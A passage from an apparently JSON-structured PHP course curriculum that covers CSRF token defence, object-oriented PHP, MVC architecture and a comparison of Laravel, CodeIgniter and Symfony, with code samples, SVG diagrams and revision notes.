}

// Validate token on POST submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $clientToken = $_POST['csrf_token'] ?? '';
    if (!hash_equals($_SESSION['csrf_token'], $clientToken)) {
        http_response_code(403);
        die('CSRF token validation failed. Request blocked.');
    }
    // Proceed with authorized transaction
}
?>"
                    },
                    "diagram": {
                        "caption": "Figure 5.4: Mechanics of Cross-Site Request Forgery (CSRF) and Synchronizer Token Defense",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#D65F64' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#D65F64'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>CSRF ATTACK VECTOR &amp; SYNCHRONIZER TOKEN DEFENSE</text><rect x='40' y='75' width='210' height='125' rx='8' fill='#ffffff' stroke='#D65F64' stroke-width='1.5'/><text x='145' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#D65F64' text-anchor='middle'>Malicious Web Page</text><text x='55' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>• Hidden Auto-Submit Form</text><text x='55' y='145' font-family='sans-serif' font-size='10' fill='#19283D'>• Target: /transfer.php</text><text x='55' y='170' font-family='sans-serif' font-size='10' fill='#D65F64'>⚠ Lacks Secret CSRF Token</text><path d='M 255 135 L 325 135' stroke='#D65F64' stroke-width='2.5'/><text x='290' y='125' font-family='sans-serif' font-size='9' font-weight='700' fill='#D65F64' text-anchor='middle'>Forged POST</text><rect x='330' y='75' width='210' height='125' rx='8' fill='#ffffff' stroke='#377FE6' stroke-width='1.5'/><text x='435' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#377FE6' text-anchor='middle'>Victim Browser</text><text x='345' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>• Active Session Cookie</text><text x='345' y='150' font-family='sans-serif' font-size='10' fill='#617087'>• Cookie automatically sent</text><text x='345' y='170' font-family='sans-serif' font-size='10' fill='#377FE6'>• Browser unaware of deceit</text><path d='M 545 135 L 615 135' stroke='#369B72' stroke-width='2.5'/><text x='580' y='125' font-family='sans-serif' font-size='9' font-weight='700' fill='#369B72' text-anchor='middle'>Verify</text><rect x='620' y='75' width='140' height='125' rx='8' fill='#ffffff' stroke='#369B72' stroke-width='1.5'/><text x='690' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#369B72' text-anchor='middle'>Server Guard</text><text x='635' y='125' font-family='monospace' font-size='9' fill='#19283D'>hash_equals()</text><text x='635' y='150' font-family='sans-serif' font-size='10' fill='#D65F64'>No token matched</text><text x='635' y='175' font-family='sans-serif' font-size='10' font-weight='700' fill='#369B72'>✓ REQUEST BLOCKED</text></svg>"
                    },
                    "examples": {
                        "scenario": "Live Banking Transfer Protected by CSRF Token",
                        "code": "<?php
session_start();
// Rendered inside transfer form:
?>
<form method='POST' action='transfer.php'>
  <input type='hidden' name='csrf_token' value='<?= $_SESSION['csrf_token'] ?>'>
  <input type='text' name='amount' placeholder='Amount'>
  <button type='submit'>Transfer</button>
</form>"
                    },
                    "important_points": [
                        "SQL Injection is prevented by prepared statements with bound parameters.",
                        "Cross-Site Scripting (XSS) is neutralized by escaping output with `htmlspecialchars()`.",
                        "Cross-Site Request Forgery (CSRF) is defeated using secret per-session tokens.",
                        "Always use `hash_equals()` for comparing security tokens to prevent timing attack side-channels.",
                        "Implement Content Security Policy (CSP) headers to restrict external script execution."
                    ],
                    "revision": {
                        "summary": "Application security requires defense against SQLi (prepared statements), XSS (output escaping), and CSRF (synchronizer tokens). Adhering to OWASP guidelines ensures resilient software.",
                        "terminology": "SQL Injection, XSS, CSRF, Anti-CSRF Token, hash_equals, CSP, Defense-in-depth.",
                        "mechanisms": "Token Generation -> Hidden Input Binding -> Server hash_equals Validation -> Request Execution.",
                        "common_mistakes": "Comparing cryptographic tokens using standard `==`, opening the door to timing attack exploits."
                    }
                }
            ]
        },
        {
            "module_no": 6,
            "title": "Advanced PHP Concepts (Object-Oriented PHP)",
            "hours": 5,
            "marks": 5,
            "topics": [
                {
                    "id": "php_m6_t1",
                    "title": "Object-Oriented PHP: Classes, Objects, Visibility Modifiers, Constructors & Inheritance",
                    "subtopics": ["Class Definition & Object Instantiation", "Visibility Modifiers (public, protected, private)", "Constructors (__construct) & Destructors (__destruct)", "Class Inheritance (extends keyword) & parent::"],
                    "intro": {
                        "definition": "Object-Oriented Programming (OOP) in PHP is a programming paradigm organized around data objects rather than actions, bundling attributes (properties) and behaviors (methods) into reusable class blueprints.",
                        "background": "Early PHP versions (PHP 3 & 4) had rudimentary object support. The release of the Zend Engine II in PHP 5 introduced a comprehensive OOP model with visibility controls, interfaces, abstract classes, and reflection. PHP 8 added constructor property promotion and readonly classes.",
                        "importance": "OOP principles (Encapsulation, Inheritance, Polymorphism, Abstraction) allow engineering scalable, modular enterprise applications like Laravel, WordPress, and Symfony.",
                        "objectives": [
                            "Declare classes, instantiate objects, and access properties with -> operator.",
                            "Apply public, protected, and private visibility modifiers.",
                            "Implement __construct() and __destruct() lifecycle methods.",
                            "Extend base classes using inheritance and invoke parent constructors."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "A class is an architectural blueprint. An object is a concrete instance of that blueprint in memory. Properties store state, while methods implement business rules.",
                        "terminology": [
                            {"term": "Encapsulation", "definition": "Restricting direct external modification of internal object state using private/protected visibility."},
                            {"term": "Inheritance", "definition": "Mechanism where a child class inherits properties and methods from a parent class via `extends`."},
                            {"term": "$this", "definition": "Pseudo-variable referencing the current calling object instance."}
                        ],
                        "principles": "1. Single Responsibility Principle (SRP): A class should have only one reason to change.\n2. Open/Closed Principle: Classes should be open for extension, but closed for modification.",
                        "structures": "class Child extends Parent { public function __construct() { parent::__construct(); } }"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Define class blueprint using the `class` keyword.",
                            "2. Declare properties with visibility modifiers: `private string $name`.",
                            "3. Define `public function __construct(...)` for initialization during instantiation.",
                            "4. Create instances using `$obj = new ClassName(...)`.",
                            "5. Access methods and properties using the object operator `->`.",
                            "6. Derive child classes using `extends`; override methods to achieve polymorphism.",
                            "7. Use `parent::methodName()` to execute parent class behavior."
                        ],
                        "comparison_table": {
                            "headers": ["Visibility Modifier", "Same Class", "Derived Child Class", "External Caller"],
                            "rows": [
                                ["public", "Accessible", "Accessible", "Accessible"],
                                ["protected", "Accessible", "Accessible", "Blocked (Inaccessible)"],
                                ["private", "Accessible", "Blocked (Inaccessible)", "Blocked (Inaccessible)"]
                            ]
                        },
                        "code_architecture": "<?php
class User {
    protected string $name;
    protected string $email;

    public function __construct(string $name, string $email) {
        $this->name = $name;
        $this->email = $email;
    }
    public function getProfile(): string {
        return "Name: {$this->name}, Email: {$this->email}";
    }
}

class Student extends User {
    private string $rollNumber;

    public function __construct(string $name, string $email, string $roll) {
        parent::__construct($name, $email);
        $this->rollNumber = $roll;
    }
    public function getProfile(): string {
        return parent::getProfile() . ", Roll: {$this->rollNumber}";
    }
}
$student = new Student('Ananya Sen', 'ananya@makaut.ac.in', 'BCA501');
echo $student->getProfile();
?>"
                    },
                    "diagram": {
                        "caption": "Figure 6.1: Object-Oriented Inheritance and Property Visibility in PHP",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#377FE6'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>CLASS INHERITANCE HIERARCHY &amp; VISIBILITY RULES</text><rect x='60' y='75' width='280' height='125' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='200' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>Base Class: User</text><text x='75' y='125' font-family='monospace' font-size='11' fill='#19283D'># protected string $name</text><text x='75' y='145' font-family='monospace' font-size='11' fill='#19283D'># protected string $email</text><text x='75' y='170' font-family='monospace' font-size='11' fill='#377FE6'>+ public getProfile(): string</text><path d='M 345 135 L 445 135' stroke='#377FE6' stroke-width='2.5'/><text x='395' y='125' font-family='sans-serif' font-size='10' font-weight='700' fill='#377FE6' text-anchor='middle'>extends</text><rect x='450' y='75' width='290' height='125' rx='8' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='595' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#28A994' text-anchor='middle'>Child Class: Student</text><text x='465' y='125' font-family='monospace' font-size='11' fill='#D65F64'>- private string $rollNumber</text><text x='465' y='150' font-family='monospace' font-size='11' fill='#377FE6'>+ public __construct(...)</text><text x='465' y='175' font-family='monospace' font-size='11' fill='#28A994'>+ public getProfile(): string (Overrides)</text></svg>"
                    },
                    "examples": {
                        "scenario": "E-Commerce Product Class Hierarchy",
                        "code": "<?php
class Product {
    public function __construct(
        public string $title,
        public float $price
    ) {}
}
$p = new Product('Wireless Mouse', 499.00);
echo $p->title . ' costs ₹' . $p->price;
?>"
                    },
                    "important_points": [
                        "`public` members are accessible everywhere; `protected` inside hierarchy; `private` within defining class only.",
                        "The `__construct()` method runs automatically upon object instantiation.",
                        "PHP supports single inheritance for classes; child classes use the `extends` keyword.",
                        "`parent::__construct()` invokes the constructor of the parent class.",
                        "PHP 8 supports Constructor Property Promotion, reducing boilerplate property declarations."
                    ],
                    "revision": {
                        "summary": "Object-Oriented PHP provides encapsulation, inheritance, and polymorphism. Visibility controls protect class state, while constructors initialize objects cleanly.",
                        "terminology": "Class, Object, public, protected, private, __construct, inheritance, extends, parent::.",
                        "mechanisms": "Class Blueprint -> Object Allocation -> Constructor Invocation -> Property Initialization.",
                        "common_mistakes": "Forgetting that `private` properties in a parent class cannot be accessed by child classes; `protected` must be used instead."
                    }
                },
                {
                    "id": "php_m6_t2",
                    "title": "Built-in OOP Features: Interfaces, Abstract Classes, Namespaces & Magic Methods",
                    "subtopics": ["Abstract Classes vs Interfaces", "Traits for Horizontal Code Reuse", "PSR-4 Autoloading & Namespaces", "Magic Methods (__get, __set, __toString, __call)"],
                    "intro": {
                        "definition": "Advanced OOP in PHP provides structural architectural patterns including abstract classes for partial blueprints, interfaces for strict contracts, traits for horizontal code composition, and namespaces for symbol collision prevention.",
                        "background": "As PHP codebases grew into millions of lines, dependency clashes and rigid inheritance hierarchies created difficulties. PHP 5.3 introduced namespaces, and PHP 5.4 introduced traits, enabling the modern Composer package ecosystem.",
                        "importance": "Modern PHP frameworks (Laravel, Symfony) rely entirely on interfaces for dependency injection, namespaces for modularity, and magic methods for dynamic functionality.",
                        "objectives": [
                            "Differentiate interfaces from abstract classes.",
                            "Implement multiple interfaces in a single class.",
                            "Organize code using namespaces and PSR-4 autoloading standards.",
                            "Harness magic methods: __toString(), __get(), __set(), and __call()."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "An abstract class cannot be instantiated directly and can contain both concrete methods and abstract method signatures. An interface contains purely method signatures with zero implementation.",
                        "terminology": [
                            {"term": "Interface", "definition": "A contract specifying which methods a class must implement, declared via the `interface` keyword."},
                            {"term": "Trait", "definition": "A mechanism for code reuse in single inheritance languages allowing methods to be shared across unrelated classes."},
                            {"term": "Namespace", "definition": "A virtual directory separating class names to prevent name collision across libraries."}
                        ],
                        "principles": "1. Program to an Interface, Not an Implementation: Code against contracts to decouple components.\n2. Dependency Inversion: High-level modules should not depend on low-level modules; both should depend on abstractions.",
                        "structures": "interface PaymentGateway { public function pay(float $amt): bool; } | class Stripe implements PaymentGateway {...}"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Define an interface: `interface LoggerInterface { public function log(string $msg): void; }`.",
                            "2. Implement interface in concrete classes using `implements LoggerInterface`.",
                            "3. If multiple behaviors are needed across independent classes, encapsulate them in a `trait` and include via `use TraitName`.",
                            "4. Wrap files in namespaces: `namespace App\Services;`.",
                            "5. Import symbols in other scripts using `use App\Services\LoggerInterface;`.",
                            "6. Intercept dynamic member calls using magic methods like `__toString()` and `__get()`."
                        ],
                        "comparison_table": {
                            "headers": ["Architectural Dimension", "Abstract Class", "Interface"],
                            "rows": [
                                ["Method Implementation", "Can contain both concrete and abstract methods", "Purely method signatures (no body)"],
                                ["Property Declarations", "Supports properties (public, protected, private)", "Constants only (no instance properties)"],
                                ["Inheritance Rule", "A class can extend only one abstract class", "A class can implement multiple interfaces"],
                                ["Primary Purpose", "Shared base blueprint with default behavior", "Strict API contracts and polymorphism"]
                            ]
                        },
                        "code_architecture": "<?php
namespace App\Payment;

interface PaymentProcessor {
    public function charge(float $amount): bool;
}

class RazorpayGateway implements PaymentProcessor {
    public function charge(float $amount): bool {
        // Connect to Razorpay API
        return true;
    }
}

class CheckoutService {
    public function __construct(private PaymentProcessor $gateway) {}
    public function processOrder(float $total): void {
        $this->gateway->charge($total);
    }
}
?>"
                    },
                    "diagram": {
                        "caption": "Figure 6.2: Interface Contracts and Dependency Inversion in Advanced PHP",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#786CE5' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#786CE5'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>INTERFACE POLYMORPHISM &amp; DEPENDENCY INJECTION</text><rect x='260' y='70' width='280' height='60' rx='8' fill='#E9E8F8' stroke='#786CE5' stroke-width='1.5'/><text x='400' y='92' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>&lt;&lt;interface&gt;&gt; PaymentGateway</text><text x='400' y='115' font-family='monospace' font-size='11' fill='#19283D' text-anchor='middle'>+ charge(float $amt): bool</text><path d='M 230 160 L 330 135' stroke='#377FE6' stroke-width='2' stroke-dasharray='4,4'/><rect x='80' y='160' width='220' height='50' rx='6' fill='#ffffff' stroke='#377FE6' stroke-width='1.5'/><text x='190' y='180' font-family='sans-serif' font-size='11' font-weight='700' fill='#377FE6' text-anchor='middle'>RazorpayProvider</text><text x='190' y='198' font-family='sans-serif' font-size='10' fill='#617087' text-anchor='middle'>implements charge()</text><path d='M 570 160 L 470 135' stroke='#28A994' stroke-width='2' stroke-dasharray='4,4'/><rect x='500' y='160' width='220' height='50' rx='6' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='610' y='180' font-family='sans-serif' font-size='11' font-weight='700' fill='#28A994' text-anchor='middle'>StripeProvider</text><text x='610' y='198' font-family='sans-serif' font-size='10' fill='#617087' text-anchor='middle'>implements charge()</text></svg>"
                    },
                    "examples": {
                        "scenario": "Magic Method __toString() Implementation",
                        "code": "<?php
class University {
    public function __construct(private string $name, private string $code) {}
    public function __toString(): string {
        return "$this->name ($this->code)";
    }
}
$u = new University('MAKAUT', 'WBUT');
echo 'Enrolled at: ' . $u; // Output: Enrolled at: MAKAUT (WBUT)
?>"
                    },
                    "important_points": [
                        "A class can implement multiple interfaces, enabling multiple interface inheritance.",
                        "Abstract classes cannot be directly instantiated and can contain both concrete and abstract methods.",
                        "Namespaces prevent class naming collisions across third-party packages and libraries.",
                        "Traits provide horizontal code composition without requiring inheritance.",
                        "Magic methods start with double underscores (`__`) and intercept system operations."
                    ],
                    "revision": {
                        "summary": "Interfaces define contracts, abstract classes provide partial implementations, traits share horizontal functionality, and namespaces organize application architecture.",
                        "terminology": "Interface, Abstract Class, Trait, Namespace, Magic Methods, PSR-4.",
                        "mechanisms": "Contract definition -> Implementation enforcement -> Namespace resolution -> Autoloading.",
                        "common_mistakes": "Attempting to declare method bodies inside an interface, triggering fatal syntax errors."
                    }
                }
            ]
        },
        {
            "module_no": 7,
            "title": "Introduction to PHP Frameworks & MVC Architecture",
            "hours": 6,
            "marks": 10,
            "topics": [
                {
                    "id": "php_m7_t1",
                    "title": "Architectural Design Patterns: The Model-View-Controller (MVC) Framework",
                    "subtopics": ["The Spaghetti Code Problem in Legacy PHP", "The MVC Architectural Triad", "Front Controller Pattern & Centralized Routing", "Request-Response Lifecycle in MVC Frameworks"],
                    "intro": {
                        "definition": "The Model-View-Controller (MVC) pattern is an architectural design pattern that bifurcates an application into three interconnected components: Model (business logic & database storage), View (user presentation & HTML rendering), and Controller (request coordination & user inputs).",
                        "background": "Early PHP scripts mixed database queries, business rules, HTML markup, and styling into single monolithic files (spaghetti code). MVC decoupled these concerns, drastically improving code maintainability, testability, and team collaboration.",
                        "importance": "All modern enterprise web frameworks (Laravel, Symfony, Django, Spring Boot, ASP.NET MVC) utilize MVC. Understanding MVC is essential for writing professional-grade software.",
                        "objectives": [
                            "Describe the specific responsibilities of Model, View, and Controller layers.",
                            "Explain the role of the Front Controller (index.php) and centralized routing.",
                            "Trace an incoming HTTP request through the complete MVC lifecycle.",
                            "Critique monolithic spaghetti architectures versus decoupled MVC systems."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "Models represent database tables and business logic. Views render the user interface. Controllers act as intermediaries, receiving user requests from routes, querying Models, and returning Views.",
                        "terminology": [
                            {"term": "Model", "definition": "The layer encapsulating database interactions, data schema validation, and business rules."},
                            {"term": "View", "definition": "The presentation layer rendering HTML templates and formatting data for users."},
                            {"term": "Controller", "definition": "The mediator receiving user input, coordinating models, and selecting the output view."},
                            {"term": "Front Controller", "definition": "A central entry point (index.php) routing all incoming HTTP requests to their appropriate handlers."}
                        ],
                        "principles": "1. Separation of Concerns: Views never query databases directly; Models never render HTML markup.\n2. Thin Controller, Fat Model: Keep business logic inside Models/Services while keeping Controllers lightweight.",
                        "structures": "HTTP Request -> index.php (Front Controller) -> Router -> Controller -> Model (DB) -> View (HTML) -> Response"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Client browser issues an HTTP request to `http://domain.com/students`.",
                            "2. Web server rewrites all requests to the Front Controller (`public/index.php`).",
                            "3. The Router inspects the request URI and HTTP verb, matching it to `StudentController@index`.",
                            "4. Middleware handles session checks and authentication guards.",
                            "5. The Controller executes, invoking `Student::all()` on the Model layer.",
                            "6. The Model executes SQL queries on MySQL and returns domain entity records.",
                            "7. The Controller passes records to the View template (`students.index.blade.php`).",
                            "8. The View renders dynamic variables into HTML markup.",
                            "9. The Controller packages the HTML into an HTTP 200 response and returns it to the client."
                        ],
                        "comparison_table": {
                            "headers": ["MVC Component", "Core Responsibility", "What it Contains", "What it NEVER Contains"],
                            "rows": [
                                ["Model", "Data persistence & rules", "SQL queries, ORM relationships, validations", "HTML tags, HTTP headers, $_GET/$_POST"],
                                ["View", "Presentation & UI display", "HTML5, CSS, template directives, UI widgets", "SQL queries, database connections, business logic"],
                                ["Controller", "Coordination & input parsing", "Request validation, model calls, view selection", "Direct SQL queries, heavy algorithmic calculations"]
                            ]
                        },
                        "code_architecture": "<?php
// Conceptual MVC Implementation in PHP
// 1. MODEL
class StudentModel {
    public static function getAll(): array {
        return [['id' => 1, 'name' => 'Sourav'], ['id' => 2, 'name' => 'Priya']];
    }
}
// 2. CONTROLLER
class StudentController {
    public function index(): void {
        $students = StudentModel::getAll();
        require 'views/students_list.php'; // Passes data to view
    }
}
// 3. VIEW (views/students_list.php)
// <ul><?php foreach($students as $s): ?><li><?= $s['name'] ?></li><?php endforeach; ?></ul>
?>"
                    },
                    "diagram": {
                        "caption": "Figure 7.1: The Model-View-Controller (MVC) Architectural Request Lifecycle",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#377FE6'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>MVC ARCHITECTURAL WORKFLOW</text><rect x='40' y='80' width='160' height='110' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='120' y='105' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>Controller Layer</text><text x='120' y='130' font-family='sans-serif' font-size='10' fill='#19283D' text-anchor='middle'>• Intercepts Request</text><text x='120' y='150' font-family='sans-serif' font-size='10' fill='#19283D' text-anchor='middle'>• Coordinates Data</text><text x='120' y='170' font-family='sans-serif' font-size='10' fill='#377FE6' text-anchor='middle'>• Selects View</text><path d='M 205 110 L 315 110' stroke='#377FE6' stroke-width='2'/><text x='260' y='100' font-family='sans-serif' font-size='9' font-weight='700' fill='#377FE6' text-anchor='middle'>1. Queries</text><rect x='320' y='80' width='180' height='110' rx='8' fill='#ffffff' stroke='#28A994' stroke-width='1.5'/><text x='410' y='105' font-family='sans-serif' font-size='12' font-weight='700' fill='#28A994' text-anchor='middle'>Model Layer</text><text x='410' y='130' font-family='sans-serif' font-size='10' fill='#19283D' text-anchor='middle'>• Entity Relations</text><text x='410' y='150' font-family='sans-serif' font-size='10' fill='#19283D' text-anchor='middle'>• Business Rules</text><text x='410' y='170' font-family='sans-serif' font-size='10' fill='#28A994' text-anchor='middle'>• MySQL Tables</text><path d='M 320 150 L 205 150' stroke='#28A994' stroke-width='2'/><text x='260' y='165' font-family='sans-serif' font-size='9' font-weight='700' fill='#28A994' text-anchor='middle'>2. Recordset</text><path d='M 120 195 L 120 205 L 600 205 L 600 195' stroke='#786CE5' stroke-width='2'/><text x='360' y='218' font-family='sans-serif' font-size='9' font-weight='700' fill='#786CE5' text-anchor='middle'>3. Injects Data into Template</text><rect x='520' y='80' width='180' height='110' rx='8' fill='#ffffff' stroke='#F2C75C' stroke-width='1.5'/><text x='610' y='105' font-family='sans-serif' font-size='12' font-weight='700' fill='#B38600' text-anchor='middle'>View Layer</text><text x='610' y='130' font-family='sans-serif' font-size='10' fill='#19283D' text-anchor='middle'>• Blade Templates</text><text x='610' y='150' font-family='sans-serif' font-size='10' fill='#19283D' text-anchor='middle'>• HTML5 &amp; CSS3</text><text x='610' y='170' font-family='sans-serif' font-size='10' fill='#369B72' text-anchor='middle'>• Rendered Output</text></svg>"
                    },
                    "examples": {
                        "scenario": "Live University Examination Controller Action",
                        "code": "<?php
class ExamController {
    public function showResults($sem) {
        $results = ExamModel::getBySemester($sem);
        return view('exam.results', ['results' => $results]);
    }
}
?>"
                    },
                    "important_points": [
                        "MVC separates business logic (Model), user presentation (View), and input handling (Controller).",
                        "The Front Controller pattern routes all web traffic through a single file (`public/index.php`).",
                        "Views must never execute raw SQL queries; they simply format data provided by Controllers.",
                        "Controllers coordinate data flow without containing bloated business calculations.",
                        "MVC enhances testability by enabling unit tests on Models without requiring a web browser."
                    ],
                    "revision": {
                        "summary": "The Model-View-Controller pattern replaces monolithic code with structured modularity. Models manage data, Views format HTML, and Controllers coordinate flow.",
                        "terminology": "MVC, Model, View, Controller, Front Controller, Routing, Separation of Concerns.",
                        "mechanisms": "HTTP Request -> Router -> Controller -> Model -> Database -> View -> HTTP Response.",
                        "common_mistakes": "Embedding direct database queries inside view templates, violating separation of concerns."
                    }
                },
                {
                    "id": "php_m7_t2",
                    "title": "PHP Framework Ecosystem: Architectural Overview of Laravel, CodeIgniter & Symfony",
                    "subtopics": ["Framework Comparison Metrics", "CodeIgniter Architecture (Lightweight MVC)", "Symfony Components & Enterprise Bundles", "Laravel Full-Stack Ecosystem"],
                    "intro": {
                        "definition": "A web framework provides a standardized software scaffolding with pre-engineered components for database mapping, session management, routing, security filtering, and templating.",
                        "background": "The PHP framework landscape evolved from early frameworks like CakePHP and CodeIgniter (2006) to enterprise libraries like Symfony (2005) and developer-centric ecosystems like Laravel (2011 created by Taylor Otwell).",
                        "importance": "Choosing the appropriate framework determines development velocity, system throughput, security posture, and engineering scalability.",
                        "objectives": [
                            "Compare Laravel, CodeIgniter, and Symfony regarding architectural complexity and performance.",
                            "Explain how Composer packages power modern framework dependency resolution.",
                            "Identify situations where lightweight frameworks (CodeIgniter) outperform heavy frameworks.",
                            "Evaluate the role of Symfony components within the Laravel core."
                        ]
                    },
                    "fundamentals": {
                        "concepts": "CodeIgniter focuses on small footprint and near-zero configuration. Symfony provides high-performance decoupled enterprise components. Laravel offers an expressive syntax with built-in ORM, queues, and templating.",
                        "terminology": [
                            {"term": "Laravel", "definition": "A full-stack, developer-friendly PHP framework featuring Eloquent ORM, Blade templating, and Artisan CLI."},
                            {"term": "CodeIgniter", "definition": "A lightweight, high-performance MVC framework requiring minimal server configuration."},
                            {"term": "Symfony", "definition": "A set of reusable, standalone PHP components and enterprise framework powering many web projects."},
                            {"term": "Composer", "definition": "The industry-standard dependency manager for PHP."}
                        ],
                        "principles": "1. Convention over Configuration: Laravel favors sensible defaults to accelerate development.\n2. Component Reusability: Build systems on decoupled, well-tested open-source libraries.",
                        "structures": "composer create-project laravel/laravel my_app | php artisan serve"
                    },
                    "detailed_explanation": {
                        "sequence": [
                            "1. Composer resolves dependencies specified in `composer.json`.",
                            "2. CodeIgniter uses a lightweight loader class to initialize database and helper libraries.",
                            "3. Symfony utilizes dependency injection containers and YAML/attribute configurations.",
                            "4. Laravel blends Symfony HTTP components with expressive Eloquent ORM and Artisan tooling.",
                            "5. Routing handles URL dispatching, delegating to specialized controllers.",
                            "6. Framework middleware applies security headers, authentication, and session handling automatically."
                        ],
                        "comparison_table": {
                            "headers": ["Framework", "Philosophy & Architecture", "ORM Engine", "Templating Engine", "Best Suited For"],
                            "rows": [
                                ["CodeIgniter", "Lightweight, minimal footprint, fast", "Active Record query builder", "Native PHP templates", "Shared hosting, small projects, legacy upgrades"],
                                ["Symfony", "Modular, decoupled enterprise components", "Doctrine ORM (Data Mapper)", "Twig templating engine", "Complex corporate platforms, long-term APIs"],
                                ["Laravel", "Expressive, developer-centric, full-stack", "Eloquent ORM (Active Record)", "Blade templating engine", "Modern SaaS, web portals, university platforms"]
                            ]
                        },
                        "code_architecture": "// Composer dependency definition
// composer.json
{
    "require": {
        "php": "^8.2",
        "laravel/framework": "^11.0"
    }
}"
                    },
                    "diagram": {
                        "caption": "Figure 7.2: Ecosystem Comparison of Popular PHP Frameworks",
                        "svg": "<svg viewBox='0 0 800 240' xmlns='http://www.w3.org/2000/svg' style='width:100%;height:auto;max-height:240px;background:#ffffff;border-radius:8px;border:1px solid #E5E9F1;'><rect x='20' y='20' width='760' height='200' rx='10' fill='#F7F8FC' stroke='#377FE6' stroke-width='2'/><rect x='20' y='20' width='760' height='34' rx='10' fill='#377FE6'/><text x='400' y='43' font-family='sans-serif' font-size='13' font-weight='700' fill='#ffffff' text-anchor='middle'>PHP FRAMEWORK ARCHITECTURAL COMPARISON</text><rect x='40' y='75' width='210' height='125' rx='8' fill='#ffffff' stroke='#EF846B' stroke-width='1.5'/><text x='145' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#EF846B' text-anchor='middle'>CodeIgniter 4</text><text x='55' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>• Ultra-light footprint (&lt; 2MB)</text><text x='55' y='145' font-family='sans-serif' font-size='10' fill='#19283D'>• Fast execution speeds</text><text x='55' y='165' font-family='sans-serif' font-size='10' fill='#19283D'>• Minimal server requirements</text><text x='55' y='185' font-family='sans-serif' font-size='9' fill='#617087'>Best for simple shared hosting</text><rect x='295' y='75' width='210' height='125' rx='8' fill='#ffffff' stroke='#786CE5' stroke-width='1.5'/><text x='400' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#786CE5' text-anchor='middle'>Symfony 6/7</text><text x='310' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>• Decoupled components</text><text x='310' y='145' font-family='sans-serif' font-size='10' fill='#19283D'>• Enterprise dependency injection</text><text x='310' y='165' font-family='sans-serif' font-size='10' fill='#19283D'>• Strict architectural standards</text><text x='310' y='185' font-family='sans-serif' font-size='9' fill='#617087'>Powers Drupal &amp; Magento</text><rect x='550' y='75' width='210' height='125' rx='8' fill='#ffffff' stroke='#D65F64' stroke-width='1.5'/><text x='655' y='100' font-family='sans-serif' font-size='12' font-weight='700' fill='#D65F64' text-anchor='middle'>Laravel 11</text><text x='565' y='125' font-family='sans-serif' font-size='10' fill='#19283D'>• Eloquent ORM active record</text><text x='565' y='145' font-family='sans-serif' font-size='10' fill='#19283D'>• Blade templating engine</text><text x='565' y='165' font-family='sans-serif' font-size='10' fill='#19283D'>• Rich ecosystem (Auth, Queues)</text><text x='565' y='185' font-family='sans-serif' font-size='9' font-weight='700' fill='#369B72'>#1 Framework for modern web</text></svg>"
                    },
                    "examples": {
                        "scenario": "CLI Scaffolding Command in Laravel",
                        "code": "# Terminal CLI command creates Controller, Model, and Migration simultaneously
php artisan make:model Student -mcr"
                    },
                    "important_points": [
                        "Frameworks provide pre-built security defenses, database ORMs, and routing mechanisms.",
                        "Laravel is the most widely adopted PHP framework globally due to its expressive syntax.",
                        "CodeIgniter provides high performance and minimal server overhead.",
                        "Symfony provides modular components that power many third-party systems including Laravel.",
                        "Composer manages third-party libraries and generates PSR-4 autoloaders."
                    ],
                    "revision": {
                        "summary": "Modern PHP relies on frameworks to streamline web development. Laravel provides full-stack features, Symfony provides enterprise components, and CodeIgniter offers lightweight simplicity.",
                        "terminology": "Framework, Laravel, CodeIgniter, Symfony, Eloquent, Blade, Artisan, Composer.",
